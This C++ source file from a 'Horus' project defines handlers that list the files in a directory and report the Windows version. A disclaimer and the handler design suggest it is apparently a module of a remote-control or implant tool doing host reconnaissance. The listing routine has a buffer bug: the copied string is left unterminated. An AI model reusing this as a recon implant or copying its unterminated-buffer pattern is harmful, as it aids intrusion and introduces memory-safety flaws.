/*
	This file is part of Horus.
	
	Copyright (C) 2021  Horus Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <iostream>
#include <filesystem>
#include "api.hpp"
#include "fs.hpp"
#include "log.hpp"

using namespace std;

void *API::FileSystem::ListFiles(void *s)
{
    string file_list;
    string path = ".";

    if(s != nullptr) {
        // Convert to string
        path = string(static_cast<char*>(s));
    }

    Log::LogInfo("Searching for files in %s", path.c_str());

    for(auto entry : filesystem::directory_iterator(path)) {
        auto filename = entry.path().filename().generic_string();
        file_list.append(filename);
        file_list.append("\n");
    }

    auto list = static_cast<char*>(malloc(file_list.length() * sizeof(char)));
    if(list == nullptr) {
        Log::LogError("Failed to allocate memory: %s", strerror(errno));
        return nullptr;
    }

    // Copy file list to string
    strncpy(list, file_list.c_str(), file_list.length() - 1);

    return reinterpret_cast<void*>(list);
}

void *API::FileSystem::GetWindowsVersion(void *s)
{
    OSVERSIONINFOA version;
    char *szVersion = new char[BUFSIZ];

    UNUSED(s);

    RtlSecureZeroMemory(&version, sizeof(OSVERSIONINFO));
    version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if(GetVersionExA(&version)) {
        
        // Build string with version information
        snprintf(szVersion, 
                BUFSIZ - 1, 
                "%u.%u.%u.%u", version.dwMajorVersion,
                version.dwMinorVersion,
                version.dwBuildNumber,
                version.dwPlatformId
        );

        Log::LogInfo("Captured version: %s", szVersion);

        return reinterpret_cast<void*>(szVersion);
    }

    return nullptr;
}
